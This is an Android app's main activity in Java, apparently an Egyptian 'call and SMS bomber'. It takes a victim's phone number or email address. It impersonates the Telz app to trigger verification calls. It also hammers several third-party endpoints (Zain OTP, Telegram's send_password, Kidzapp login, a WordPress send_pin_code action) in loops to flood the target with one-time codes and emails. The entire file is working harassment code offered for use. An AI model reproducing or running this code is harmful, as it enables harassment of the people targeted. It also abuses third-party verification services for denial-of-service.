package com.egyptcalls.app;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {

    private EditText etPhone, etCount;
    private TextView tvStatus;
    private ProgressBar progress;
    private Button btnCall, btnEther, btnTelegram, btnEmail, btnAsia;

    private final ExecutorService executor = Executors.newFixedThreadPool(4);
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private volatile boolean busy = false;

    private static final Pattern EGYPT_PHONE = Pattern.compile("^\\+201[0125]\\d{8}$");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etPhone = findViewById(R.id.etPhone);
        etCount = findViewById(R.id.etCount);
        tvStatus = findViewById(R.id.tvStatus);
        progress = findViewById(R.id.progress);
        btnCall = findViewById(R.id.btnCall);
        btnEther = findViewById(R.id.btnEther);
        btnTelegram = findViewById(R.id.btnTelegram);
        btnEmail = findViewById(R.id.btnEmail);
        btnAsia = findViewById(R.id.btnAsia);

        btnCall.setOnClickListener(v -> startCall());
        btnEther.setOnClickListener(v -> startSpam("ether"));
        btnTelegram.setOnClickListener(v -> startSpam("telegram"));
        btnEmail.setOnClickListener(v -> startSpam("email"));
        btnAsia.setOnClickListener(v -> startSpam("asia"));
    }

    // ───────── Phone normalize ─────────
    private String normalizeEgypt(String raw) {
        String p = raw.replaceAll("[\\s\\-()]", "").trim();
        if (p.startsWith("+20")) return p;
        if (p.startsWith("20") && p.length() >= 12) return "+" + p;
        if (p.matches("^01[0125]\\d{8}$")) return "+20" + p.substring(1);
        if (p.matches("^1[0125]\\d{8}$")) return "+20" + p;
        return p;
    }

    private boolean isValidEgypt(String phone) {
        return EGYPT_PHONE.matcher(phone).matches();
    }

    // ───────── UI helpers ─────────
    private void setBusy(boolean b) {
        busy = b;
        mainHandler.post(() -> {
            progress.setVisibility(b ? View.VISIBLE : View.GONE);
            btnCall.setEnabled(!b);
            btnEther.setEnabled(!b);
            btnTelegram.setEnabled(!b);
            btnEmail.setEnabled(!b);
            btnAsia.setEnabled(!b);
        });
    }

    private void setStatus(String msg, boolean ok) {
        mainHandler.post(() -> {
            tvStatus.setText(msg);
            tvStatus.setTextColor(getResources().getColor(ok ? R.color.accent : R.color.danger, null));
        });
    }

    // ───────── Telz Call (same as Python) ─────────
    private String[] telzCall(String phone) {
        try {
            String androidId = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            String uid = UUID.randomUUID().toString();
            long ts = System.currentTimeMillis();

            postJson("https://api.telz.com/app/auth_list",
                    "{\"android_id\":\"" + androidId + "\",\"app_version\":\"17.5.48\",\"event\":\"auth_list\"," +
                    "\"os\":\"android\",\"os_version\":\"15\",\"ts\":" + ts + ",\"uuid\":\"" + uid + "\"}");

            postJson("https://api.telz.com/app/run",
                    "{\"android_id\":\"" + androidId + "\",\"app_version\":\"17.5.48\",\"device_name\":\"\"," +
                    "\"event\":\"run\",\"ipv4_address\":\"\",\"lang\":\"ar\",\"network_country\":\"eg\"," +
                    "\"network_type\":\"WIFI\",\"os\":\"android\",\"os_version\":\"15\",\"push_token\":\"\"," +
                    "\"roaming\":\"no\",\"root\":\"no\",\"run_id\":\"" + (ts / 1000) + "\"," +
                    "\"sim_country\":\"eg\",\"ts\":" + ts + ",\"uuid\":\"" + uid + "\"}");

            postJson("https://api.telz.com/app/validate_phonenumber",
                    "{\"android_id\":\"" + androidId + "\",\"app_version\":\"17.5.48\",\"event\":\"validate_phonenumber\"," +
                    "\"os\":\"android\",\"os_version\":\"15\",\"phone\":\"" + phone + "\",\"region\":\"EG\"," +
                    "\"ts\":" + ts + ",\"uuid\":\"" + uid + "\"}");

            Thread.sleep(500);

            String resp = postJson("https://api.telz.com/app/auth_call",
                    "{\"android_id\":\"" + androidId + "\",\"app_version\":\"17.5.48\",\"attempt\":\"0\"," +
                    "\"event\":\"auth_call\",\"lang\":\"ar\",\"os\":\"android\",\"os_version\":\"15\"," +
                    "\"phone\":\"" + phone + "\",\"ts\":" + ts + ",\"uuid\":\"" + uid + "\"," +
                    "\"run_id\":\"" + ts + "\"}");

            if (resp == null) return new String[]{"0", "لا رد من السيرفر"};

            JSONObject json = new JSONObject(resp);
            if ("ok".equals(json.optString("status"))) {
                return new String[]{"1", "تم إرسال المكالمة بنجاح\n" + phone};
            }
            if ("3.1".equals(json.optString("reason"))) {
                return new String[]{"0", "الرقم مسجل مسبقاً"};
            }
            return new String[]{"0", "فشل: " + json.optString("reason", resp.substring(0, Math.min(60, resp.length())))};
        } catch (Exception e) {
            return new String[]{"0", "خطأ: " + e.getMessage()};
        }
    }

    private String postJson(String urlStr, String body) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setRequestProperty("User-Agent", "Telz-Android/17.5.48");
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body.getBytes(StandardCharsets.UTF_8));
            }

            int code = conn.getResponseCode();
            BufferedReader br = new BufferedReader(new InputStreamReader(
                    code >= 400 ? conn.getErrorStream() : conn.getInputStream(),
                    StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            return sb.toString();
        } catch (Exception e) {
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // ───────── Spam helpers ─────────
    private int[] spamEther(String phone, int count) {
        int ok = 0, fail = 0;
        String local = phone.replace("+20", "0");
        for (int i = 0; i < Math.min(count, 50); i++) {
            try {
                String resp = postJson("https://mw-mobileapp.iq.zain.com/api/otp/request",
                        "{\"msisdn\":\"" + local + "\"}");
                if (resp != null) ok++; else fail++;
            } catch (Exception e) { fail++; }
            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
            final int cur = i + 1;
            mainHandler.post(() -> setStatus("اثير: " + cur + "/" + count, true));
        }
        return new int[]{ok, fail};
    }

    private int[] spamTelegram(String phone, int count) {
        int ok = 0, fail = 0;
        for (int i = 0; i < Math.min(count, 30); i++) {
            HttpURLConnection conn = null;
            try {
                URL url = new URL("https://my.telegram.org/auth/send_password");
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setConnectTimeout(6000);
                conn.setReadTimeout(6000);
                conn.setDoOutput(true);
                String body = "phone=" + phone;
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                if (sb.toString().contains("random_hash")) ok++; else fail++;
            } catch (Exception e) { fail++; }
            finally { if (conn != null) conn.disconnect(); }
            try { Thread.sleep(150); } catch (InterruptedException ignored) {}
            final int cur = i + 1;
            mainHandler.post(() -> setStatus("تيليجرام: " + cur + "/" + count, true));
        }
        return new int[]{ok, fail};
    }

    private int[] spamEmail(String email, int count) {
        int ok = 0, fail = 0;
        for (int i = 0; i < Math.min(count, 50); i++) {
            try {
                String resp = postJson("https://api.kidzapp.com/api/3.0/customlogin/",
                        "{\"email\":\"" + email + "\",\"sdk\":\"web\",\"platform\":\"desktop\"}");
                if (resp != null && resp.contains("EMAIL SENT")) ok++; else fail++;
            } catch (Exception e) { fail++; }
            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
            final int cur = i + 1;
            mainHandler.post(() -> setStatus("جيميل: " + cur + "/" + count, true));
        }
        return new int[]{ok, fail};
    }

    private int[] spamAsia(String phone, int count, String message) {
        int ok = 0, fail = 0;
        String local = phone.replace("+20", "0");
        // same base64 as python: 2ZjZrNmA
        String pkg = new String(android.util.Base64.decode("2ZjZrNmA", android.util.Base64.DEFAULT));
        for (int i = 0; i < Math.min(count, 100); i++) {
            HttpURLConnection conn = null;
            try {
                URL url = new URL("https://pashacards.net/wp-admin/admin-ajax.php");
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setConnectTimeout(6000);
                conn.setReadTimeout(6000);
                conn.setDoOutput(true);
                String body = "action=send_pin_code&msisdn=" + local +
                        "&appId=3&packageName=" + pkg + message + "&paymentMethodId=3";
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                if (sb.toString().contains("\"success\":true")) ok++; else fail++;
            } catch (Exception e) { fail++; }
            finally { if (conn != null) conn.disconnect(); }
            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
            final int cur = i + 1;
            mainHandler.post(() -> setStatus("آسيا: " + cur + "/" + count, true));
        }
        return new int[]{ok, fail};
    }

    // ───────── Actions ─────────
    private void startCall() {
        if (busy) return;
        String raw = etPhone.getText().toString().trim();
        if (raw.isEmpty()) {
            Toast.makeText(this, "اكتب الرقم", Toast.LENGTH_SHORT).show();
            return;
        }
        String phone = normalizeEgypt(raw);
        if (!isValidEgypt(phone)) {
            setStatus("❌ رقم مصري غير صحيح\nيجب 010 / 011 / 012 / 015", false);
            return;
        }

        setBusy(true);
        setStatus("جاري إرسال المكالمة...", true);

        executor.execute(() -> {
            String[] result = telzCall(phone);
            boolean ok = "1".equals(result[0]);
            setStatus((ok ? "✅ " : "❌ ") + result[1], ok);
            setBusy(false);
        });
    }

    private void startSpam(String type) {
        if (busy) return;
        String raw = etPhone.getText().toString().trim();
        if (raw.isEmpty()) {
            Toast.makeText(this, "اكتب الرقم أو الإيميل", Toast.LENGTH_SHORT).show();
            return;
        }

        int count;
        try {
            count = Integer.parseInt(etCount.getText().toString().trim());
            if (count < 1) count = 1;
            if (count > 50) count = 50;
        } catch (Exception e) {
            count = 5;
        }

        final int finalCount = count;

        if ("email".equals(type)) {
            if (!raw.contains("@")) {
                setStatus("❌ إيميل غير صحيح", false);
                return;
            }
            setBusy(true);
            setStatus("جاري سبام جيميل...", true);
            executor.execute(() -> {
                int[] r = spamEmail(raw, finalCount);
                setStatus("✅ جيميل\nنجاح: " + r[0] + " · فشل: " + r[1], true);
                setBusy(false);
            });
            return;
        }

        String phone = normalizeEgypt(raw);
        if (!isValidEgypt(phone)) {
            setStatus("❌ رقم مصري غير صحيح\n010 / 011 / 012 / 015", false);
            return;
        }

        setBusy(true);
        setStatus("جاري التنفيذ...", true);

        final String finalPhone = phone;
        executor.execute(() -> {
            int[] r;
            if ("ether".equals(type)) {
                r = spamEther(finalPhone, finalCount);
                setStatus("✅ اثير\nنجاح: " + r[0] + " · فشل: " + r[1], true);
            } else if ("telegram".equals(type)) {
                r = spamTelegram(finalPhone, finalCount);
                setStatus("✅ تيليجرام\nنجاح: " + r[0] + " · فشل: " + r[1], true);
            } else {
                // asia - message empty for now
                r = spamAsia(finalPhone, finalCount, "test");
                setStatus("✅ آسيا\nنجاح: " + r[0] + " · فشل: " + r[1], true);
            }
            setBusy(false);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        executor.shutdownNow();
    }
}
